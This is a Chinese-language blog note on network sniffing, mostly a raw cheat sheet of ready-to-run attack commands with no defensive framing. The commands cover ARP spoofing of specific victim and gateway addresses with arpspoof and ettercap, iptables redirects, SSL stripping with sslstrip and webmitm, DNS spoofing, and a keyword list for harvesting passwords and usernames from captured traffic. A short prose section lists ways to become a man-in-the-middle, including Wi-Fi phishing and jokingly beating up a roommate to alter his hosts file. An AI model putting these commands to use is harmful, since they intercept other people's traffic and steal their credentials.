---
title: 嗅探基本原理
date: 2016-03-29T21:25:45+08:00
update: 2016-01-01
categories: [网络安全]
tags:
---

fragrouter -B1
dnsspoof -i ath0 (or whatever network interface you are using)
 webmitm -d
 ettercap -T -M arp:remote /router addy/ /victim addy/
 ssldump -r your.cap -w webmitm.crt  -d > out
########
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT
iptables -A FORWARD -j ACCEPT
webmitm -d

ettercap –G
unified
ath0
arp poision
start sniffing

#########
[原文](https://blog.g0tmi1k.com/2009/07/stripping-ssl-sniffing-https/)
kate  /etc/etter.conf
# uncomment redir_command_off in the iptables, linux section
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i wlan0 -t 192.168.1.6 192.168.1.1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
ettercap -T -q -i wlan0

sslstrip -a -k -f
ettercap -T -q -i wlan0



### Alternative
wireshark

kate  /etc/etter.conf

echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

arpspoof -i eth0 -t 192.168.1.12 192.168.1.1
#ettercap -T -q -i eth0 -M ARP /192.168.1.1/ /192.168.1.12/

ettercap -T -q -i eth0

sslstrip -k -f

##########

password=','pwd=','username=','user=','pass=','email='
网络密码嗅探（Web/FTP/Email）工具 – SniffPass
metasploit下的auxiliary/sniffer/psnuffle
ettercap

## 数据流量重定向

关于数据怎么重定向到你的电脑上面也就是你怎么成为靶机和服务器的中间人，这个问题不是我们今天讨论的重点，但是因为跟本文还是有点关系，我给出几个建议方式吧：

1、ARP攻击
进内网……还用我多说么？永恒的传奇，不老的ARP。
2、DNS劫持
将靶机的DNS劫持到这里来，想做什么就好说了。
3、WIFI钓鱼
拿着个树莓派改装版或者拿着菠萝瞎溜达，哪里人多找哪里。
4、修改hosts文件
把舍友暴打一顿，然后把他的电脑的hosts文件改掉，反正他也不懂。
5、修改默认网关
把舍友暴打一顿，然后把他的电脑的默认网关改成自己的IP，反正他也不懂。
……
### ARP 欺骗工具
ARPspoof
Cain&abel
Ettercap
ARPoison
Dsniff
Parasite

## SSL

https://github.com/droe/sslsplit
